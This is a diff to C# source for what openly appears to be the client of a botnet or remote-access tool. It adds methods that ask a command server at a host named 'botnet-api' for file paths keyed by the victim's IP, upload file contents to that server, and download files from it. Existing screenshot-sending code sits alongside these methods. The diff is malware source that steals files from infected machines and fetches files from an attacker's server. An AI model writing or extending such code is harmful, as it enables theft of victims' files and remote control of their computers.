@@ -1,10 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
-using System.Net.Http.Headers;
+using System.IO;
 using System.Web.Script.Serialization;
 
 namespace HttpHandler
@@ -17,6 +15,12 @@ namespace HttpHandler
     {
         public uint id { get; set; }
         public byte[] bytes { get; set; }
+    }
+    public class File
+    {
+        public uint id { get; set; }
+        public string filepath { get; set; }
+        public byte[] file { get; set; }
     }
     public class Command
     {
@@ -31,6 +35,62 @@ namespace HttpHandler
     }
     public class Class1
     {
+        public static async Task<string> SendFilePathAsync(string ip)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            string pth = null;
+            var resp = await client.GetAsync($"/api/v1/getfilespath/{ip}");
+            if (resp.IsSuccessStatusCode)
+            {
+                pth = await resp.Content.ReadAsAsync<string>();
+                return pth;
+            }
+            else
+            {
+                return pth;
+            }
+        }
+        public static async Task SendFileAsync(uint id, string ip, string path, byte[] bt)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            File file = new File { id=id, filepath = path, file=bt};
+            string json = new JavaScriptSerializer().Serialize(file);
+            await client.PostAsync($"/api/v1/getfiles/{ip}", new StringContent(json));
+        }
+        public static async Task<byte[]> GetFileAsync(string Ip)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
+            byte[] bt = new byte[104857600];
+            if (response.IsSuccessStatusCode)
+            {
+                bt = await response.Content.ReadAsAsync<byte[]>();
+                return bt;
+            }
+            else
+            {
+                return bt;
+            }
+        }
+        public static async Task<string> GetFilePathAsync(string Ip)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
+            string res = null;
+            if (response.IsSuccessStatusCode)
+            {
+                res = await response.Content.ReadAsAsync<string>();
+                return res;
+            }
+            else
+            {
+                return res;
+            }
+        }
         public static async Task ScreenSendAsync(string Id, byte[] bt)
         {
             HttpClient client = new HttpClient();
